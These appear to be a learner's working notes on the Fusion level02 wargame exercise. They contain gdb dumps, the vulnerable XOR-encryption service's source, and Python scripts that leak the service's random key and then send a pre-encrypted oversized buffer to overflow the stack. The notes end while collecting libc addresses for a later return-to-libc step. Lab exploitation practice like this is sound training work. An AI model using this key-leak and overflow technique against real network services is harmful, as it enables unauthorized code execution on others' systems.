
# Registers

eax            0xbf8b351c	-1081395940
ecx            0xbf8d0517	-1081277161
edx            0x3005	12293
ebx            0x935ff4	9658356
esp            0xbf8b3500	0xbf8b3500
ebp            0xbf8d3528	0xbf8d3528
esi            0x0	0
edi            0x0	0
eip            0x80498a4	0x80498a4 <encrypt_file+173>
eflags         0x246	[ PF ZF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

# Stack

Dump of assembler code for function encrypt_file:
   0x080497f7 <+0>:	push   ebp
   0x080497f8 <+1>:	mov    ebp,esp
   0x080497fa <+3>:	sub    esp,0x20028
   0x08049800 <+9>:	mov    DWORD PTR [esp],0x8049e04
   0x08049807 <+16>:	call   0x8048930 <puts@plt>
   0x0804980c <+21>:	mov    DWORD PTR [ebp-0xc],0x1
   0x08049813 <+28>:	jmp    0x804990a <encrypt_file+275>
   0x08049818 <+33>:	mov    DWORD PTR [esp+0x8],0x1
   0x08049820 <+41>:	lea    eax,[ebp-0x2000d]
   0x08049826 <+47>:	mov    DWORD PTR [esp+0x4],eax
   0x0804982a <+51>:	mov    DWORD PTR [esp],0x0
   0x08049831 <+58>:	call   0x804952d <nread>
   0x08049836 <+63>:	movzx  eax,BYTE PTR [ebp-0x2000d]
   0x0804983d <+70>:	movzx  eax,al
   0x08049840 <+73>:	cmp    eax,0x45
   0x08049843 <+76>:	je     0x8049853 <encrypt_file+92>
   0x08049845 <+78>:	cmp    eax,0x51
   0x08049848 <+81>:	je     0x80498f5 <encrypt_file+254>
   0x0804984e <+87>:	jmp    0x80498fe <encrypt_file+263>
   0x08049853 <+92>:	mov    DWORD PTR [esp+0x8],0x4
   0x0804985b <+100>:	lea    eax,[ebp-0x20014]
   0x08049861 <+106>:	mov    DWORD PTR [esp+0x4],eax
   0x08049865 <+110>:	mov    DWORD PTR [esp],0x0
   0x0804986c <+117>:	call   0x804952d <nread>
   0x08049871 <+122>:	mov    eax,DWORD PTR [ebp-0x20014]
   0x08049877 <+128>:	mov    DWORD PTR [esp+0x8],eax
   0x0804987b <+132>:	lea    eax,[ebp-0x2000c]
   0x08049881 <+138>:	mov    DWORD PTR [esp+0x4],eax
   0x08049885 <+142>:	mov    DWORD PTR [esp],0x0
   0x0804988c <+149>:	call   0x804952d <nread>
   0x08049891 <+154>:	mov    eax,DWORD PTR [ebp-0x20014]
   0x08049897 <+160>:	mov    DWORD PTR [esp+0x4],eax
   0x0804989b <+164>:	lea    eax,[ebp-0x2000c]
   0x080498a1 <+170>:	mov    DWORD PTR [esp],eax
=> 0x080498a4 <+173>:	call   0x8049735 <cipher>
   0x080498a9 <+178>:	mov    DWORD PTR [esp],0x8049e40
   0x080498b0 <+185>:	call   0x8048930 <puts@plt>
   0x080498b5 <+190>:	mov    DWORD PTR [esp+0x8],0x4
   0x080498bd <+198>:	lea    eax,[ebp-0x20014]
   0x080498c3 <+204>:	mov    DWORD PTR [esp+0x4],eax
   0x080498c7 <+208>:	mov    DWORD PTR [esp],0x1
   0x080498ce <+215>:	call   0x80495a0 <nwrite>
   0x080498d3 <+220>:	mov    eax,DWORD PTR [ebp-0x20014]
   0x080498d9 <+226>:	mov    DWORD PTR [esp+0x8],eax
   0x080498dd <+230>:	lea    eax,[ebp-0x2000c]
   0x080498e3 <+236>:	mov    DWORD PTR [esp+0x4],eax
   0x080498e7 <+240>:	mov    DWORD PTR [esp],0x1
   0x080498ee <+247>:	call   0x80495a0 <nwrite>
   0x080498f3 <+252>:	jmp    0x804990a <encrypt_file+275>
   0x080498f5 <+254>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080498fc <+261>:	jmp    0x804990a <encrypt_file+275>
   0x080498fe <+263>:	mov    DWORD PTR [esp],0x1
   0x08049905 <+270>:	call   0x8048960 <exit@plt>
   0x0804990a <+275>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x0804990e <+279>:	jne    0x8049818 <encrypt_file+33>
   0x08049914 <+285>:	leave  
   0x08049915 <+286>:	ret    
End of assembler dump.

(gdb) x/100x $esp
0xbf8b3500:	0xbf8b351c	0x00020000	0x00020000	0x00000000
0xbf8b3510:	0x00000000	0x00020000	0x45000000	0x41414141
0xbf8b3520:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3530:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3540:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3550:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3560:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3570:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3580:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3590:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b35a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b35b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b35c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b35d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b35e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b35f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3600:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3610:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3620:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3630:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf8b3680:	0x41414141	0x41414141	0x41414141	0x41414141



# Hint 
This level deals with some basic obfuscation / math stuff.

This level introduces non-executable memory and return into libc / .text / return orientated programming (ROP).

Vulnerability Type 				Stack
Position Independent Executable 		No
Read only relocations 				No
Non-Executable stack 				Yes
Non-Executable heap 				Yes
Address Space Layout Randomisation 		Yes
Source Fortification				No



# Source Code
#include "../common/common.c"    

#define XORSZ 32

void cipher(unsigned char *blah, size_t len)
{
  static int keyed;
  static unsigned int keybuf[XORSZ];

  int blocks;
  unsigned int *blahi, j;

  if(keyed == 0) {
      int fd;
      fd = open("/dev/urandom", O_RDONLY);
      if(read(fd, &keybuf, sizeof(keybuf)) != sizeof(keybuf)) exit(EXIT_FAILURE);
      close(fd);
      keyed = 1;
  }

  blahi = (unsigned int *)(blah);
  blocks = (len / 4);
  if(len & 3) blocks += 1;

  for(j = 0; j < blocks; j++) {
      blahi[j] ^= keybuf[j % XORSZ];
  }
}

void encrypt_file()
{
  // http://thedailywtf.com/Articles/Extensible-XML.aspx
  // maybe make bigger for inevitable xml-in-xml-in-xml ?
  unsigned char buffer[32 * 4096];

  unsigned char op;
  size_t sz;
  int loop;

  printf("[-- Enterprise configuration file encryption service --]\n");
  
  loop = 1;
  while(loop) {
      nread(0, &op, sizeof(op));
      switch(op) {
          case 'E':
              nread(0, &sz, sizeof(sz));
              nread(0, buffer, sz);
              cipher(buffer, sz);
              printf("[-- encryption complete. please mention "
              "474bd3ad-c65b-47ab-b041-602047ab8792 to support "
              "staff to retrieve your file --]\n");
              nwrite(1, &sz, sizeof(sz));
              nwrite(1, buffer, sz);
              break;
          case 'Q':
              loop = 0;
              break;
          default:
              exit(EXIT_FAILURE);
      }
  }
      
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *p;

  background_process(NAME, UID, GID); 
  fd = serve_forever(PORT);
  set_io(fd);

  encrypt_file();







# Create A Level02 Dir




fusion@fusion:~/level02$ cat exploit.py 
#!/usr/bin/python
import struct

size = 32*4

payload = ''
payload+= "E" # Bypass E Condition
payload+= struct.pack("i", size)
payload+= 'A'*size

payload+= payload

print payload



# Wikipedia Encryption Example

# URL : https://en.wikipedia.org/wiki/XOR_cipher


fusion@fusion:~/level02$ cat encr.py 
from __future__ import print_function, unicode_literals
from os import urandom


def genkey(length):
    """Generate key"""
    return urandom(length)
    

def xor_strings(s, t):
    """xor two strings together"""
    if isinstance(s, str):
        # Text strings contain single characters
        return "".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))
    else:
        # Python 3 bytes objects contain integer values in the range 0-255
        return bytes([a ^ b for a, b in zip(s, t)])
        

message = 'This is a secret message'
print('message:', message)

key = genkey(len(message))
print('key:', key)

cipherText = xor_strings(message.encode('utf8'), key)
print('cipherText:', cipherText)
print('decrypted:', xor_strings(cipherText, key).decode('utf8'))

# verify
if xor_strings(cipherText, key).decode('utf8') == message:
    print('Unit test passed')
else:
    print('Unit test failed')



# Exploit Stage One

fusion@fusion:~/level02$ cat attacker.py 
#!/usr/bin/python
import struct
import socket
import time


def xor_st(s, t):
	return "".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))



# ==========================================================
#               Try To GET Keybuf Value
# ==========================================================


# Input
i = "\x00"*32*4
size = len(i)

# Create Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 20002))



#print "[+] Receving Banner"
#print s.recv(100)
s.send("E")
s.send(struct.pack("I", size))
s.send(i)
print s.recv(128)

time.sleep(0.5)
rec = s.recv(200)
print [rec]

rec = rec.split('\n')[1]

print "[+] Our Sent Input  : ", i
print "[+] Input Length    : ", len(i)
print "[+] Output Length   : ", len(rec)
print "[+] Output Size     : ", struct.unpack("I",rec[:4])
print "[+] Output          : ", rec[4:].encode('hex')


# ================================================================
#                    Second Stage
# ================================================================

i = xor_st("A"*34*4096, rec[4:])
size = len(i)
s.send("E")
s.send(struct.pack("I", size))
s.send(i)
print s.recv(128)

time.sleep(0.5)
rec = s.recv(200)
print [rec]

rec = rec.split('\n')[1]

print "[+] Our Sent Input  : ", i
print "[+] Input Length    : ", len(i)
print "[+] Output Length   : ", len(rec)
print "[+] Output Size     : ", struct.unpack("I",rec[:4])
print "[+] Output          : ", rec[4:].encode('hex')




s.close()




# fusion@fusion:~/level02$ cat .gdbinit 
set follow-fork-mode child
set disassembly-flavor intel
set pagination off
attach 1325

#define hook-stop
#i r
#x/100x $ebp-96
#end

#break *encrypt_file+173
#break *cipher+95
#break *encrypt_file+185
#break *encrypt_file+270
#break *encrypt_file+279
c





# Stage 2 Exploit
#!/usr/bin/python
import struct
import socket
import time


# Key Size GLobal Variable
key_sz = 32*4


# XOR cipher function
def crypt(value, key):
	print "[+] Cipher Key Length  : ", len(key)
	print "[+] Cipher Data Length : ", len(value)
	return ''.join([chr(ord(value[x])^ord(key[x % key_sz])) for x in range(len(value))])



# ===========================================================================
#               Stage One Generate Random Key And Leak it
# ==========================================================================


# Input
i = "\x00"*key_sz                # NULL Pointer (We will receive Pure Random Key In Output)
size = key_sz 

# Create Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 20002))

# print "[+] Receving Banner"
# print s.recv(100)



# Sending Data
print "[+] Stage 1 Starting... Trying To Retrive Victim Random Key"
s.send("E")                      # Condition E Bypass
time.sleep(0.5)
s.send(struct.pack("I", size))   # File Size
time.sleep(0.5)
s.send(i)                        # Send Payload
s.recv(128)                # Recv Banner
time.sleep(2)
rec = s.recv(1024)                # Recv Key
print [rec]

# Extracting Data
rec = rec.split('\n')[1]
print "[+] Our Sent Input  : ", i
print "[+] Input Length    : ", len(i)
print "[+] Output Length   : ", len(rec)
print "[+] Output Size     : ", struct.unpack("I",rec[:4])
print "[+] Output          : ", rec[4:].encode('hex')       # Random Key
# Key
rkey = rec[4:]
print "[+] Stage 1 . Random Key Leakage Complete."



# ================================================================
#                    Second Stage (Send overflowing Data)
# ================================================================
print "[+] Stage 2 Started [Exploiting Buffer Overflow]."
# Generate Payload
# Trying Length = 34 * 4096
payload = 'A' * 1025 * 128  # 1025*128  # + "Q" #open('pat', 'r').read()




# Send Data (hahaha! Just Ignore Cipher Function Encryption)
print "[+] Encrypting Buffer Data"
i = crypt(payload, rkey) # Because Cipher Conquer Function Is Here
size = len(i)
print "[+] Encryption Complete."


# Clean socket.
#s.recv(0xffffff)
#s.send("Q")
time.sleep(0.5)

print "[+] Sending Payload"
s.send("E")
s.send(struct.pack("I", size))
s.send(i)


time.sleep(0.5)
rec = s.recv(len(payload)*2)
rec = rec.split('\n')[1]

# To Check Our Payload Output
# print "[+] Our Sent Input  : ", i
print "[+] Input Length    : ", len(i)
print "[+] Output Length   : ", len(rec)
print "[+] Output Size     : ", struct.unpack("I",rec[:4])
# print "[+] Output          : ", rec[4:]


s.close()
































##
Trying To Find Libc Address


$1 = (<text variable, no debug info> *) 0x6bdb20 <__libc_system>
$2 = (<text variable, no debug info> *) 0x6e13b0 <_IO_puts>
$3 = (<text variable, no debug info> *) 0x71c910 <__execve>



Currently libc Starting point : 0x00681174

